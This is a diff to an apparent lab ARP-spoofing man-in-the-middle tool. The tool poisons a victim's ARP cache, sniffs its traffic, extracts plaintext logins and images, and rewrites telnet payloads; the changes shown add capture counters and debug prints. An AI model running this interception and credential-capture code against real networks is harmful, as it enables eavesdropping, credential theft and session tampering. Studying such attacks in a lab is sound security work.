@@ -50,6 +50,9 @@ class Arper:
         self.first100 = []
         self.gotfirst100 = False
 
+
+        self.pkt_capture_count = 0
+
     def run(self):
         """
         create concurrent processes to sniff and poison
@@ -83,7 +86,11 @@ class Arper:
             # print(packet.summary())
             yield packet
 
-    def filterWrite(self, captured_packets, pkt_count):
+    def filterWrite(self, captured_packets):
+        print(f"captured {self.victim_ip} {self.pkt_capture_count}")
+        self.pkt_capture_count += 1
+
+
         first_100, plaintest_passwd_user, img_responses, modified_telnet = filter(
             capture_itr=captured_packets).processPackets(captured_packets)
 
@@ -106,14 +113,17 @@ class Arper:
     def sniff(self, count=100):
         # this function performs the sniffing attack
         victim_ip_filter = f"ip host {self.victim_ip}"
+        #gateway_ip_filter = f"ip gateway {self.gateway_ip}"
         packet_gen = self.packet_sniff(victim_ip_filter, count=1)
+
+        #scapy.sniff(prn=lambda x: self.filterWrite([x]), filter=filter)
 
         i = 0
         # for i in range(count):
         while i != count:
             pkt_batch = next(packet_gen)
             i += len(pkt_batch)
-            self.filterWrite(pkt_batch, i)
+            self.filterWrite(pkt_batch)
 
             print(f"captured {self.victim_ip} {i}/{count}")
 
@@ -154,10 +164,13 @@ class filter:
             if counter < 100:
                 first_100.append(pkt)
             if self.longinPkt(pkt):
+                print("login captured")
                 plaintest_passwd_user.append(pkt)
             if self.respImgPkt(pkt):
+                print("image captured")
                 img_responses.append(pkt)
             if self.telnetPkt(pkt):
+                print("telnet captured")
                 telnet_pkts.append(pkt)
                 modified_pkt = self.modifyTCPDFData(pkt=pkt, repalceWith="R")
                 if modified_pkt is not None:
@@ -324,6 +337,7 @@ class filter:
 def arpSpoof():
     # (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
     #(victim, destination, interface) = ("192.168.2.120", "192.168.2.1", "wlp59s0")
+
     (victim, destination, interface) = ("10.9.0.5", "10.9.0.6", "vetha75a8aa")
     myarp = Arper(victim, destination, interface)
     myarp.run()
